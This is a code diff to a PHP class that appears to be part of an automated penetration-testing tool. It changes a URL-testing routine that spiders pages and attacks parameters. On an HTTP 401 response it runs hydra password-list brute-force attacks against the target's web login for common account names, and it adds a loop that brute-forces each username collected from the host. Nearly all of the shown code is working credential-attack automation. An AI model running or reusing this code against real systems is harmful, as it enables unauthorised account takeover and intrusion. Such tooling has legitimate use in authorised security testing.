@@ -129,10 +129,10 @@ class URL extends WEB{
 	
 	
 	public function url4pentest(){
-	    $result = "";
+
 	    $this->gtitre(__FUNCTION__);
 	    $my_arr = array();
-        $result .= $this->url2spider();
+        $this->url2spider();
         //$result .= $this->url2scan(); //takes too long time
         
         $OS = $this->ip2os4arch($this->ip2os());
@@ -142,12 +142,11 @@ class URL extends WEB{
 			    
 			    $obj_fi = new PARAM($this->eth,$this->domain,$this->url,$key,$value,"GET");
 			    $obj_fi->poc($this->flag_poc);
-				$result .= $obj_fi->param4pentest($OS);
+				$obj_fi->param4pentest($OS);
 				$this->pause();
 		}
 					}
 
-					return $result;
 		
 	}
 	
@@ -158,7 +157,6 @@ class URL extends WEB{
 	    $result = "";
 	    $this->ssTitre(__FUNCTION__);
 	    $code = "";
-	    $auth_401 = "";
 	    $result = "";
 	    if (!empty($this->url)){
 	        
@@ -174,13 +172,18 @@ class URL extends WEB{
 	        $this->web2response($code);
 	        switch ($code) {
 	            case "401" :
-	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"root\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
 	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"admin\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
 	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"guest\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
 	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"administrator\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
 	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"user\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
 	                $this->auth2login4hydra($this->req_ret_str("hydra -l \"test\" -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));
-	                
+	               $tab_users=$this->ip2users4shell();
+	               if(!empty($tab_users)){
+	                   foreach ($tab_users as $user){
+	                       $user = trim($user);
+	                    if (!empty($user)) $this->auth2login4hydra($this->req_ret_str("hydra -l '$user' -P $this->dico_users.small $this->ip http-get -s $this->port '$this->uri_path' -w 5s 2>/dev/null | grep -i  'login:' "));	                       
+	                   }
+	               }
 	                break;
 	            case "200" :
 	                $result .= $this->url2ok();
